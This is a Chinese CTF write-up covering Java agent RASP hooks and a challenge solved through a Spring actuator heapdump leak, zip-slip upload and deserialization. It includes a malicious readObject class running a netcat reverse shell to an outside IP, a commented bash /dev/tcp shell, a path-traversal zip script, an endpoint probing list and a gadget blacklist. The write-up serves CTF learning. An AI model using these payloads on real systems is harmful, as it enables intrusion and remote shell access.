看源码发现猜错了,用的是agentmain

```java
premain、agentmain区别
假设main函数都有输出，则结果为
premain
main
agentmain
```

```java
package org.example.agent;

import org.example.transformer.MyAgentTransformer;
import java.lang.instrument.Instrumentation;
import java.lang.instrument.UnmodifiableClassException;

public class MyAgent {
    public static void agentmain(String args, Instrumentation inst) throws  UnmodifiableClassException {

        System.out.println("start agentmain");
        MyAgentTransformer agentTransformer = new MyAgentTransformer();
       
        String prefix = "myPrefix_";
        String className;
        Class<?>[] clazz = inst.getAllLoadedClasses();
        inst.addTransformer(agentTransformer, true);
        inst.setNativeMethodPrefix(agentTransformer, prefix);
        for (Class<?> c: clazz) {
            className = c.getName();
            if(className.equals("java.lang.UNIXProcess") || className.equals("java.lang.ClassLoader")) {
                //如果是这俩种类型
                inst.retransformClasses(c);
            }
        }
    }
    public static void premain(String args, Instrumentation inst) {}
}

```

实现了一个ClassFileTransformer的子类。addTransformer方法配置之后，后续的类加载都会被Transformer拦截，在`transform`方法中对字节码进行修改后再返回。

所以这里就会调用

```java
public class MyAgentTransformer implements ClassFileTransformer {
    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
        String name = className.replace("/", ".");
        if(name.equals("java.lang.UNIXProcess")) {
            return HookRce.transformed();
        } else if (name.equals("java.lang.ClassLoader")) {
            return HookJNI.transformed();
        }
        return classfileBuffer;
    }
}
```

```java
package org.example.hook;

import javassist.*;

public class HookJNI {
    public static byte[] transformed() {
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = null;
        try {
            System.out.println("start convert java.lang.ClassLoader");
            clazz = pool.getCtClass("java.lang.ClassLoader");
            if(clazz.isFrozen()) {
                clazz.defrost();
            }
            CtMethod method = clazz.getDeclaredMethod("loadLibrary0");
            System.out.println("modify method loadLibrary0");
            method.insertBefore("throw new RuntimeException(\"RASP hooked loadLibrary0\");");
            System.out.println("has modified method loadLibrary0");
            return clazz.toBytecode();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return new byte[0];
    }
}
//这里挺牛的，直接在第一行添加throws方法，而且用的是javassist不是ASM字节码
```

```java
package org.example.hook;

import javassist.*;

public class HookRce {
    public static byte[] transformed() {
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = null;
        try {
            System.out.println("start convert java.lang.UNIXProcess");
            clazz = pool.getCtClass("java.lang.UNIXProcess");
            if(clazz.isFrozen()) {
                clazz.defrost();
            }
//            CtMethod method = CtNewMethod.make("int Wrapping_forkAndExec(int var1, byte[] var2, byte[] var3, byte[] var4, int var5, byte[] var6, int var7, byte[] var8, int[] var9, boolean var10);", clazz);
//            method.setModifiers(Modifier.PRIVATE|Modifier.NATIVE);
//            System.out.println("add new native method Wrapping_forkAndExec");
//            clazz.addMethod(method);
            CtMethod method1 = clazz.getDeclaredMethod("forkAndExec");
            System.out.println("remove old native method forkAndExec");
            clazz.removeMethod(method1);
            CtMethod method2 = CtNewMethod.make("int forkAndExec(int var1, byte[] var2, byte[] var3, byte[] var4, int var5, byte[] var6, int var7, byte[] var8, int[] var9, boolean var10) { throw new RuntimeException(\"RASP hooked forkAndExec\"); }", clazz);
            System.out.println("add new method forkAndExec");
            clazz.addMethod(method2);
            return clazz.toBytecode();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return new byte[0];
    }
}
//这个类有点意思，本来作者想给native加个包装的可能报错的问题
//直接删掉自己写上了这个类（猜测无奈之举 bushi）
```

premain加上这个即可

```java
// premain
if (inst.isNativeMethodPrefixSupported()) {
    // 添加native方法前缀解析
    inst.setNativeMethodPrefix(transformer, NATIVE_PREFIX);
} else {
    throw new UnsupportedOperationException("Native Method Prefix UnSupported");
}
```

```java
package com.demo.rasp.hook;

import javassist.*;
import javassist.bytecode.AccessFlag;

public class ProcessImplHook {
    public static byte[] transform() throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.getCtClass("java.lang.ProcessImpl");
        if (clazz.isFrozen()) {
            clazz.isFrozen();
        }
        CtMethod create = clazz.getDeclaredMethod("create");
        CtMethod wrapped = CtNewMethod.copy(create, clazz, null);
        wrapped.setName("RASP_create");
        clazz.addMethod(wrapped);

        create.setModifiers(create.getModifiers() & ~AccessFlag.NATIVE);
        create.setBody("{if($1.equals(\"calc\")) throw new RuntimeException(\"protected by RASP :)\");return RASP_create($1,$2,$3,$4,$5);}");
        clazz.detach();
        return clazz.toBytecode();
    }
}
//相当于换了个名字，但是这种的好处是不会破坏原来的功能
```

## 探测出不出网

![image-20231109155041385](..\img\final\image-20231109155041385.png)

这里其实以前也遇到过，不过是偶然的javabase64加密的问题，所以我们可以让python进行加密

不理解，python kali全试了

![image-20231109160847238](..\img\final\image-20231109160847238.png)



## Deserialize?Upload!（0解）

泄露的env中与解题相关的信息不止一条

环境中存在classes目录

上面是给的二条提示

### 当时做的时候前一道java就卡住了，这道看都不敢看😟

先不看wp，自己看看能做到第一步嘛

常规的依赖，但是多了这个（打柏鸟杯的时候好像见过，带我翻翻笔记）

![image-20231108201410590](..\img\final\image-20231108201410590.png)

当时是这个/heapdump的泄露

![image-20231108201736516](..\img\final\image-20231108201736516.png)

```java
/api-docs
/v2/api-docs
/swagger-ui.html
/api.html
/sw/swagger-ui.html
/api/swagger-ui.html
/template/swagger-ui.html
/spring-security-rest/api/swagger-ui.html
/spring-security-oauth-resource/swagger-ui.html
/mappings
/actuator/mappings
/metrics
/actuator/metrics
/beans
/actuator/beans
/configprops
/actuator/configprops
/actuator
/auditevents
/autoconfig
/caches
/conditions
/docs
/dump
/env
/flyway
/health
/heapdump
/httptrace
/info
/intergrationgraph
/jolokia
/logfile
/loggers
/liquibase
/prometheus
/refresh
/scheduledtasks
/sessions
/shutdown
/trace
/threaddump
/actuator/auditevents
/actuator/health
/actuator/conditions
/actuator/env
/actuator/info
/actuator/loggers
/actuator/heapdump
/actuator/threaddump
/actuator/scheduledtasks
/actuator/httptrace
/actuator/jolokia
/actuator/hystrix.stream
```

/trace：显示最近的http包信息，可能泄露当前系统存活的Cookie信息。
/env：应用的环境信息，包含Profile、系统环境变量和应用的properties信息，可能泄露明文密码与接口信息。
/jolokia：RCE漏洞
/heapdump：JVM内存信息，分析出明文密码
————————————————
直接照搬过来一个个测试呗，

![image-20231108202630609](..\img\final\image-20231108202630609.png)

### 下载了一个heapdump工具，但是仍然找不到password

```java
sage:> java -jar heapdump_tool.jar  heapdump
查询方式：
1. 关键词       例如 password 
2. 字符长度     len=10    获取长度为10的所有key或者value值
3. 按顺序获取   num=1-100 获取顺序1-100的字符
4. class模糊搜索  class=xxx 获取class的instance数据信息
5. id查询       id=0xaaaaa  获取id为0xaaaaa的class或者object数据信息
4. re正则查询    re=xxx  自定义正则查询数据信息
获取url,file,ip
shirokey 获取shirokey的值
geturl   获取所有字符串中的url
getfile  获取所有字符串中的文件路径文件名
getip    获取所有字符串中的ip
默认不输出查询结果非key-value格式的数据，需要获取所有值，输入all=true，all=false取消显示所有值。
```

![image-20231108204046333](..\img\final\image-20231108204046333.png)

## 不知道要获取啥，先润去看看源码

#### AuthConfig

```java
public class AuthConfig {
    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        ((HttpSecurity) ((HttpSecurity) http.authorizeRequests().antMatchers("/").permitAll().antMatchers("/admin/**").authenticated().
                         and()).formLogin().loginProcessingUrl(DefaultLoginPageGeneratingFilter.DEFAULT_LOGIN_PAGE_URL).permitAll().and()).csrf().disable();
        return http.build();
    }
}
```

我丢，这么 一长串的过滤我真的***，感觉是限制了/admin这个路由叭

```java
@RequestMapping({"/admin"})
@Controller
/* loaded from: app.jar:BOOT-INF/classes/com/example/nochain/Controller/AdminController.class */
public class AdminController {
    @Value("${file.upload.path}")
    private String path;

    @RequestMapping({"/*"})
    public String index() {
        return "admin";
    }

    @PostMapping({"/upload"})
    @ResponseBody
    public Information upload(@RequestPart MultipartFile file) throws Exception {
        Information information = new Information();
        String filename = file.getOriginalFilename();
        if (!Pattern.matches(".*(\\.zip)$", filename)) {
            information.status = 0;
            information.text = "仅支持zip格式";
            return information;
        }
        byte[] b = new byte[4];
        file.getInputStream().read(b, 0, b.length);
        if (!Coding.bytesToHexString(b).toUpperCase().equals("504B0304")) {
            information.status = 0;
            information.text = "hacker!";
            return information;
        }
        String filepath = this.path + "/" + filename;
        File res = new File(filepath);
        if (res.exists()) {
            information.status = 0;
            information.text = "文件已存在";
            return information;
        }
        Files.copy(file.getInputStream(), res.toPath(), new CopyOption[0]);
        String path = filepath.replace(".zip", "");
        new File(path).mkdirs();
        Unzip.unzip(res, information, path);
        information.status = 1;
        information.filename = filepath;
        information.text = "上传成功";
        return information;
    }

    @GetMapping({"/deserialize"})
    public void deserialize(@RequestParam("b64str") String b64str) throws Exception {
        new SafeObjectInputStream(new ByteArrayInputStream(Base64.getDecoder().decode(b64str))).readObject();
    }
}
```

```java
public class SafeObjectInputStream extends ObjectInputStream {
    private static final Set<String> BLACKLIST = new HashSet();

    static {
        BLACKLIST.add("com.fasterxml.jackson.databind.node.POJONode");
        BLACKLIST.add("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
        BLACKLIST.add("java.lang.Runtime");
        BLACKLIST.add("java.security.SignedObject");
    }

    public SafeObjectInputStream(InputStream is) throws Exception {
        super(is);
    }

    @Override // java.io.ObjectInputStream
    protected Class<?> resolveClass(ObjectStreamClass input) throws IOException, ClassNotFoundException {
        if (!BLACKLIST.contains(input.getName())) {
            return super.resolveClass(input);
        }
        throw new SecurityException("Hacker!!");
    }
}
```

此时我能说啥，给了个反序列化入口，给了一巴掌（jackson 、templates、Runtime、二次反序列化全没了），🤬🤬🤬好好好这么玩是叭。

```java
脑子又又又蹦出来一个想法，上传个jsp马？zip封装？全局搜索了一下，没有找到上传文件的路径
```



只能到这里了。。。。

看到✌们直接掏出了

```java
java自带的工具jvisualvm，分析heapdump
    jvisualvm
```

进行了一波OQL查询

```java
select s from java.util.LinkedHashMap$Entry s where /spring.security.user.password/.test(s.key);
```

nm这还来fake_flag？？？？？（我的锅，这个问了一下，应该是出题人后期修改了heapdump这个文件，这里是我本地搭建的）

![image-20231108212457246](..\img\final\image-20231108212457246.png)



其实看wp，通过env泄露就可以得知java_home的位置，运行脚本的位置在那,要运行的class也在那,所以就是那有啥class都会运行

![image-20231108215929932](..\img\final\image-20231108215929932.png)

### 然后配合文件上传直接传一个恶意的文件到classes目录，这里用到了解压文件穿越

```java
import java.io.*;
public class exp implements Serializable {

    private  void readObject(ObjectInputStream in) throws InterruptedException, IOException, ClassNotFoundException {
        in.defaultReadObject();
        Process p = Runtime.getRuntime().exec(new String[]{"nc","43.143.192.19","1145","-e","/bin/sh"});
        //Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","bash -i >& /dev/tcp/x.x.x.x/x 0>&1"});
        InputStream is = p.getInputStream();
        BufferedReader reader = new BufferedReader(new InputStreamReader(is));
        p.waitFor();
        if(p.exitValue()!=0){
        }
        String s = null;
        while((s=reader.readLine())!=null){
            System.out.println(s);
        }
    }
}
```

编译为class文件，通过脚本构造zip 

```java
import zipfile
 
zipFile = zipfile.ZipFile("poc.zip", "a", zipfile.ZIP_DEFLATED)
info = zipfile.ZipInfo("poc.zip")
zipFile.write("./Evil.class", "../../../usr/lib/jvm/java-8-openjdk-amd64/jre/classes/Evil.class", zipfile.ZIP_DEFLATED)
zipFile.close()
```

```java
@GetMapping({"/deserialize"})
    public void deserialize(@RequestParam("b64str") String b64str) throws Exception {
        new SafeObjectInputStream(new ByteArrayInputStream(Base64.getDecoder().decode(b64str))).readObject();
    }
}
//直接序列化数据，new exp()然后base64加密传入即可
//因此我们构造的恶意类是实现序列化的接口的，然后直接readObject()就会反弹shell
```



### 感觉这道题的文件压缩跨目录解压是不戳的，学习一手

漏洞点其实在解压的时候，（上传没问题），这个filename是解压中的文件夹名字如果为，../../不就任意文件了嘛

![image-20231109152712138](..\img\final\image-20231109152712138.png)

哈，还真可以

![image-20231109153424796](..\img\final\image-20231109153424796.png)

![image-20231109153532882](..\img\final\image-20231109153532882.png)

利用这个脚本生成的zip，层次结构好清晰哦

![image-20231109153748398](..\img\final\image-20231109153748398.png)

搞定收工！！！